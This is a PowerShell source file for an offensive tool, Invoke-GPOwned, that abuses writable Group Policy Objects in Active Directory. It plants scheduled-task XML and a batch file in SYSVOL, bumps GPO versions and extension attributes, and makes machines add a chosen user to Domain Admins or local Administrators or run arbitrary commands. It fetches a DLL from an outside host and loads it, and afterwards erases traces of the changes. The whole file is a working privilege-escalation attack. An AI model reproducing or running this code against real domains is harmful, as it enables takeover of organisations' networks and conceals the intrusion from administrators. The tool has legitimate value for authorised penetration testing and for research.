function Invoke-GPOwned {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [Alias("guid")]
        [string]$GPOGUID,
        
        [Parameter(Mandatory=$false)]
        [Alias("xml")]
        [string]$ScheduledTasksXMLPath,

        [Parameter(Mandatory=$false)]
        [Alias("u")]
        [string]$User,

        [Parameter(Mandatory=$false)]
        [Alias("a")]
        [string]$Author,

        [Parameter(Mandatory=$false)]
        [Alias("d")]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [Alias("c")]
        [string]$Computer,
        
        [Parameter(Mandatory=$false)]
        [Alias("h")]
        [switch]$Help,

        [Parameter(Mandatory=$false)]
        [switch]$DA,

        [Parameter(Mandatory=$false)]
        [switch]$Local,

        [Parameter(Mandatory=$false)]
        [Alias("dll")]
        [string]$LoadDLL,

        [Parameter(Mandatory=$false)]
        [string]$CMD,
        
        [Parameter(Mandatory=$false)]
        [Alias("ps")]
        [string]$PowerShell,

        [Parameter(Mandatory=$false)]
        [Alias("stx")]
        [string]$SecondTaskXMLPath,

        [Parameter(Mandatory=$false)]
        [Alias("scmd")]
        [string]$SecondXMLCMD,  
        
        [Parameter(Mandatory=$false)]
        [Alias("sps")]
        [string]$SecondPowerShell,

        [Parameter(Mandatory=$false)]
        [string]$Log  
    )

    if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
        Write-Output @"
Invoke-GPOwned Help:

Examples: 
- GPO Linked to DC:
Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer dc01.noteasy.local

- GPO Linked to a workstation:
Invoke-GPOwned -GPOGUID {387547AA-B67F-4D7B-A524-AE01E56751DD} -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -User UserToElevate -Computer pc01.noteasy.local -Local

- GPO Linked to a workstation with a DA Session:
Invoke-GPOwned -GPOGUID "{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}" -LoadDLL .\Microsoft.ActiveDirectory.Management.dll -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -c "pc-01.noteasy.local" -Author "DAUser" -SecondTaskXMLPath ".\wsadd.xml" -SecondXMLCMD '/r net group "domain admins" UserToElevate /add /dom'

Parameters:
-GPOGUID/-guid: Group Policy GUID
-ScheduledTasksXMLPath/-xml: Full path to the ScheduledTasks xml file
-SecondTaskXMLPath/-stx: Using the the wsadd.xml file, run commands as a domain admin on workstations that are not domain controllers, if used there's no need to supply -CMD or -PowerShell flags
-Computer/-c: Target computer
-Local: Adds a chosen user to the local administrators group on the defined computer
-DA: Adds the user to the domain admins group
-CMD: Execute a custom cmd command
-PowerShell/-ps: Execute a custom powershell command
-SecondXMLCMD/-scmd: Execute a command with the second XML technique
-SecondPowerShell/-sps: Execute a command with the second XML technique
-User/-u: Target user to elevate, mandatory for Local technique
-Domain/-d: Target domain, current domain is used by default
-LoadDLL/-dll: Load the Microsoft.ActiveDirectory.Management.dll from a custom path, if not supplied it will try to download it to the current directory
-Log: Log the entire output of the tool into a text file
"@
        return
    }

$red = Write-Output "$([char]0x1b)[101m[-]$([char]0x1b)[0m"
$green = Write-Output "$([char]0x1b)[102m[+]$([char]0x1b)[0m"
$gray = Write-Output "$([char]0x1b)[100m[*]$([char]0x1b)[0m"
    # Enabling TLS and loading the ActiveDirectory module to memory #
if($Log){
    Start-Transcript -Path $Log
}
if(!($LoadDLL)){
    iwr https://ownd.lol/NIdmxycw/Microsoft.ActiveDirectory.Management.dll -OutFile Microsoft.ActiveDirectory.Management.dll
    Import-Module .\Microsoft.ActiveDirectory.Management.dll
    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
        $null
    } else {
        $red+" ActiveDirectory module failed to load!"
        return
    }
} elseif($LoadDLL) {
    Import-Module $LoadDLL -ErrorAction Stop
    $mod = (Get-Module | select Name -ExpandProperty Name | findstr /i activedirectory)
    if(($mod.Contains("Microsoft.ActiveDirectory")) -eq "True"){
        $null
    } else {
        $red+" ActiveDirectory module failed to load!"
        return
    }
} else {
    $red+" Couldn't load DLL, exiting..."
    return
}
    $guid = $GPOGUID
    $guid2 = "{"+$guid+"}"
    
    # Use provided domain or get it from AD
    if ($Domain) {
        $domain = $Domain
    } else {
        $domain = (Get-ADDomain).Forest
    }

    $domaindn = (Get-ADDomain).DistinguishedName
    
    # Use provided DC or get it from AD
    if ($Computer) {
        $dc = $Computer
    } else {
        $dc = (Get-ADDomain).InfrastructureMaster
    }

    # Checking for gPCMachineExtensionNames for the means of backup and restoration after execution #
    if(Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames -ErrorAction SilentlyContinue){
        $InitialExtensions = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames);
    } else {
        $noext=1
    }

    # Look for an active domain admin account #
    if($Author){
        $dauser = $Author
    } else {
        $i = 0
        while($gotcha -ne "1"){
            $dauser = (Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName -ExpandProperty SamAccountName)[$i]
            if(((net user $dauser /dom | findstr active)[29]) -eq "Y"){
                $gotcha++
            } else {
                $i++
            }
        }
    }
    $validatexml = Get-Content $ScheduledTasksXMLPath
    if(-not(Test-Path $ScheduledTasksXMLPath)){
        $red+" XML file not found!."
        break
    }elseif($validatexml.StartsWith("<?xml version")){
        $green+" XML File is valid!."
    }else{
        $red+" XML file empty or corrupted!."
        exit(0)
    }
    if($SecondTaskXMLPath){
        $validatesecondxml = Get-Content $SecondTaskXMLPath
        if(-not(Test-Path $SecondTaskXMLPath)){
        $red+" XML file not found!."
        break
    }
    elseif($validatesecondxml.StartsWith("<?xml version")){
        $green+" Second XML File is valid!."
        $cont = "powershell -NoProfile -ExecutionPolicy Bypass -Command `"Start-Process powershell -Verb RunAs -ArgumentList `"(`$Task=Get-Content '\\dc-01.noteasy.local\sysvol\noteasy.local\Policies\{D552AC5B-CE07-4859-9B8D-1B6A6BE1ACDA}\Machine\Preferences\ScheduledTasks\wsadd.xml' -raw); Register-ScheduledTask -Xml `$Task -TaskName OWNED2`""
        Set-Content -Path .\add.bat -Value $cont
        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
        Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
        Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
        $green+" Created wsadd.xml and add.bat files in SYSVOL!"
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $boundary = (Get-Date).AddHours(24).ToString("s")
        if($SecondXMLCMD){
            $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml"
            $encoding = 'ASCII'
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "autoremove","$boundary"} |
                        Set-Content -Encoding $encoding $xmlfile -Force                        
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "commandtype","cmd.exe"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$SecondXMLCMD"} |
                            Set-Content -Encoding $encoding $xmlfile -Force
        } elseif($SecondPowerShell){
            $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml"
            $encoding = 'ASCII'
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "autoremove","$boundary"} |
                        Set-Content -Encoding $encoding $xmlfile -Force                  
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "commandtype","powershell.exe"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
            $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
            $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$SecondPowerShell"} |
                            Set-Content -Encoding $encoding $xmlfile -Force
        }else{
            $red+" XML file empty or corrupted!."
        return
        } 
    }
    }
    # Checking whether a ScheduledTasks.xml file exists in SYSVOL for the means of backup and restoration after execution #
    if(Get-Content "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -ErrorAction SilentlyContinue){
        Copy-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old"
       $gray+" ScheduledTasks file in SYSVOL exists, created a backup file!"
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
    } else {
        New-Item -ItemType File -Path "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        Copy-Item $ScheduledTasksXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" -Force 2>&1>$null
        $green+" Created ScheduledTasks file in SYSVOL!"
    }

    # Modifying the ScheduledTasks.xml with the gathered information #
    if($DA){
        if(!$User){
            $User = Read-Host "Supply user to elevate!"
            if($User -eq $null){
                return
        }
        }
        $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$dacommand"} |
                        Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified to add $User to the Domain Admins group!"
    } elseif($Local){
        if(!$User){
            $User = Read-Host "Supply user to elevate!"
            if($User -eq $null){
                return
        }
        }
        $localcommand = '/r net localgroup Administrators '+$User+' /add'
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","$localcommand"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
    } else {

        if($SecondTaskXMLPath){
            $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified with the supplied custom command!."
        }
        if($PowerShell){
            if(($PowerShell.StartSwith("-c "))){
                $PowerShell = $PowerShell.replace("-c ","")
            } elseif(($PowerShell.StartSwith("-Command "))){
                $PowerShell = $PowerShell.replace("-Command ","")
        }
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "cmd.exe","powershell.exe"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","-Command $PowerShell"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified with the supplied powershell custom command!."
    } if($CMD){
        if(($CMD.StartSwith("/c "))){
            $CMD = $CMD.replace("/c ","")
        } elseif(($CMD.StartSwith("/r "))){
            $CMD = $CMD.replace("/r ","")
        }
        $pwd = (Get-Location | Select-Object Path -ExpandProperty Path)
        $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        $encoding = 'ASCII'
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedomain","$domain"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changeuser","$dauser"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "ownuser","$User"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "changedc","$dc"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
        $xmlfilecontent | ForEach-Object {$_ -replace "argumentspace","/r $CMD"} |
                    Set-Content -Encoding $encoding $xmlfile -Force
        $green+" ScheduledTasks file modified with the supplied custom command!."
    } if(!$CMD -and !$PowerShell -and !$SecondTaskXMLPath) {
        $red+" Either the -Local/-DA/-CMD/-PowerShell flags are required for execution!."
        return
    }
    }
    $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
    $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
    $gray+" Incrementing GPT.INI Version by 1"
    $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
    $encoding = 'ASCII'
    $gptIniContent = Get-Content -Encoding $encoding -Path $gptIniFilePath
    # Incrementing GPI.INI version by 1 to update the SYSVOL Machine policy #
    foreach ($s in $gptIniContent) {
        if($s.StartsWith("Version")) {
            $num = ($s -split "=")[1]
            $ver = [Convert]::ToInt32($num)
            $newVer = $ver + 1
            (Get-Content $gptIniFilePath) | ForEach-Object {$_ -replace "$ver","$newver" } |
                Set-Content -Encoding $encoding $gptIniFilePath -Force
        }
    }
    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
    $gray+" Current GPO AD versionNumber = $currentVersion"
    $gray+" Incrementing version by 1"
    $newVersionValue = $currentVersion+1
    # Incrementing the AD Machine policy by 1 to match the new SYSVOL policy number #
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber -Value $newVersionValue
    $currentVersion = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name versionNumber | Select-Object versionNumber -ExpandProperty versionNumber)
    $gray+" GPO AD versionNumber = $currentVersion"
    if($noext -ne 1){
        $gray+" Current gPCMachineExtensionNames : $InitialExtensions"
    } else {
        $gray+" Current gPCMachineExtensionNames : <not set>"
    }
    # Modyfing the gPCMachineExtensionNames attribute of the policy # 
    $gray+" Adding Extensions to the attribute"
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value $Ext$InitialExtensions
    $FinalizedGPO = (Get-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCMachineExtensionNames | Select-Object gPCMachineExtensionNames -ExpandProperty gPCMachineExtensionNames)
    if($FinalizedGPO.StartsWith("[{00000000")){
        $green+" Successfully written extensions to GPO!"
    } else {
        $red+" Failed to write gPCMachineExtensionNames!"
        return
    }
    # A bad loading screen counting up to 300(5 minute update interval on DCs) #
    if($DA){
        for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
            if ((Get-ADGroupMember "Domain Admins" | findstr $User) -ne $null) {
                break
            }
        }
        $timepassed = 0
        while((Get-ADGroupMember "Domain Admins" | findstr $User) -eq $null){
            Start-Sleep 1
            }
        Write-Output "`n`n"
        $green+" User added to the domain admins group!"
    } elseif($Local){
         for ($x = 1; $x -le 300; $x++ ){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -ne $null) {
                break
            }
        }
        $timepassed = 0
        while((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | select Name -ExpandProperty Name | findstr $User) -eq $null){
            Start-Sleep 1
            }
        $green+" User added to the local admins group!"
     }elseif($CMD -or $PowerShell){
        for ($x = 1; $x -le 300; $x++){
            $PercentCompleted = ($x/300*100)
            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
            Start-Sleep -Seconds 1
        }
    }
    $gray+" Reverting extensions back to what they were"
    # Reverting the gPCMachineExtensionNames #
    if($noext -ne 1){
    Set-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames -Value "$InitialExtensions"
    } else {
        Clear-ItemProperty "AD:\CN=$guid,CN=Policies,CN=System,$domaindn" -Name gPCmachineExtensionNames
    }
    if($noext -ne 1){
        $green+" gPCMachineExtensionNames reverted back to -> $InitialExtensions"
    } else {
        $green+" Cleared gPCMachineExtensionNames!"
    }
    $gray+" Removing the scheduled task from the DC"
    # Trying to delete the scheduled task from the DC #
    try{
        Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED" -Confirm:$false
        }
    catch{
        $red+" Scheduled Task Removal Failed! login to $dc and check if it's already removed, or remove it manually!."
    }
    if($SecondTaskXMLPath){
        try{
            Unregister-ScheduledTask -CimSession $dc -TaskName "OWNED2" -Confirm:$false
            }
        catch{
            $red+" Second Scheduled Task Removal Failed! login to the $dc and check if it's already removed, or remove it manually!."
        }
        # Reverting the ScheduledTasks.xml to the backup or deletes it #
        Remove-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
        if(Get-Item "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old" -ErrorAction SilentlyContinue){
            Move-Item \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml.old \\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
            $green+" XML file restored!"
        } else {
            $green+" File removed from SYSVOL"
        }
    }
    if($Log){
        Stop-Transcript
    }
}
